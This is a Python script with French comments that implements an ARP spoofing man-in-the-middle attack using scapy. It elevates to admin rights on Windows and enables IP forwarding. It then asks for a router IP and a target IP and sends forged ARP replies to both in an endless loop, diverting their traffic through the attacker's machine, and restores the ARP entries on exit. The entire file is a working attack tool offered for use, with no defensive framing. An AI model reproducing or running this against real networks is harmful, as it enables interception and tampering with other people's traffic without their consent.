#!/usr/bin/python

#pour forward les packets, il suffit de modifier la valeur dans le fichier /proc/sys/net/ipv4/ip_forward -> 0:off ; 1:on, voir le programme ifforwarding a executer en sudo su

import scapy.all as scapy
import os
import argparse
import sys
import time
import admin
import ctypes

unicode = str

def run_as_admin(argv=None, debug=False):
    shell32 = ctypes.windll.shell32
    if argv is None and shell32.IsUserAnAdmin():
        return True

    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        # Support pyinstaller wrapped program.
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    if debug:
        print('Command line: ', executable, argument_line)
    ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

#==============================================PARTIE ARP SPOOFER===============================================
def restore(destination_IP, source_IP):
	target_mac = get_target_mac(destination_IP)
	source_mac = get_target_mac(source_IP)
	packet = scapy.ARP(op=2, pdst=destination_IP, hwdst=target_mac,psrc=source_IP,hwsrc=source_mac)
	scapy.send(packet, verbose=False)

def get_target_mac(ip):
	arp_request = scapy.ARP(pdst=ip) #on cree un paquet arp avec pour ip de destination l'ip en argument
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #l'adresse sur laquelle tous les appareils ecoutent
	finalpacket = broadcast/arp_request #on concatene les deux
	answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0] #on garde que la 1ere partie de la liste qui est la reponse
	mac = answer[0][1].hwsrc
	return(mac)

def spoof_arp(target_IP,spoofed_IP):
	mac = get_target_mac(target_IP)
	packet = scapy.ARP(op=2, hwdst=mac, pdst=target_IP, psrc=spoofed_IP)
	scapy.send(packet, verbose=False)

def main():
	#==============================PARTIE ADMIN RIGHTS===============================
	ret = run_as_admin()
	if ret is True:
		print('I have admin privilege.')
		input('Press ENTER to exit.')
	elif ret is None:
		print('I am elevating to admin privilege.')
		input('Press ENTER to exit.')
	else:
		print('Error(ret=%d): cannot elevate privilege.' % (ret, ))

	verbose = True
	enable_ip_route()

	#==================================PARTIE ARP SPOOFER===============================
	try:
		router_IP = str(input("[*] Enter router IP: "))
		tgt_IP = str(input("[*] Enter target IP: "))
		print("Running...")
		while True:
			try:
				spoof_arp(router_IP,tgt_IP) #un pour le routeur 
				spoof_arp(tgt_IP,router_IP) #un autre pour le pc cible
			except IndexError:
				print("Index error je continue")
				pass
			except TypeError:
				print("Type error je continue")
				pass


	finally:
		restore(router_IP,tgt_IP)
		restore(tgt_IP,router_IP)
		print("Parametres restaures a l'origine")
		exit(0)


main()

